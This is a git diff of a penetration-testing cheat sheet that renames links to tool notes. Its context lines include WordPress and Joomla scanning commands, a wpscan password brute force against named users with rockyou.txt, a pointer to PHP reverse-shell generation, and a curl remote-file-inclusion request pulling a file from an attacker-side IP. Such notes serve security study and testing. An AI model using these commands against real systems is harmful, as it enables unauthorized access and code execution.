@@ -514,7 +514,7 @@ ffuf -u 'http://192.168.11.21/test.php?FUZZ=test' -w /usr/share/wordlists/seclis
 # CMS-Specific
 
 ### WordPress
-#### [wpscan](../tools/wpscan.md)
+#### [2_wpscan](../tools/web_scan/cms/2_wpscan.md)
 ```bash
 wpscan --url http://192.168.201.239/ --enumerate vp,u,vt,tt --verbose
 ```
@@ -522,7 +522,7 @@ wpscan --url http://192.168.201.239/ --enumerate vp,u,vt,tt --verbose
 ```zsh
 wpscan --url http://192.168.201.239/ --passwords /usr/share/wordlists/rockyou.txt --usernames c0ldd,hugo,philip
 ```
-#### [wpprobe](../tools/web_scan/cms/wpprobe.md)
+#### [3_wpprobe](../tools/web_scan/cms/3_wpprobe.md)
 ```zsh
 wpprobe scan -u http://192.168.147.123/wordpress -v
 ```
@@ -535,7 +535,7 @@ wpprobe scan -f targets.txt -t 20 -o results.json
 → [WordPress_PHP](../weaponization/Generate_ReverseShell/WordPress_PHP) 
 ### Joomla 
 
-[joomscan](../tools/web_scan/cms/joomscan.md)
+[4_joomscan](../tools/web_scan/cms/4_joomscan.md)
 ```bash
 joomscan -u http://localhost/
 ```
@@ -624,7 +624,7 @@ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/si
 #### Example:
 - [ RFI Using an Existing Web Shell File](../99_attack_repo/01-50_web/web_lfi_executing-a-command.md)
 -  [Using Pentestmonkey](../99_attack_repo/01-50_web/web_lfi_executing-a-command.md)
- [php_wrapper](../tools/php_wrapper.md)
+ [5_php_wrapper](../tools/5_php_wrapper.md)
 *By using a wrapper, it is possible to bypass filters in PHP web applications or execute code by exploiting file inclusion vulnerabilities.*
 
 </details>
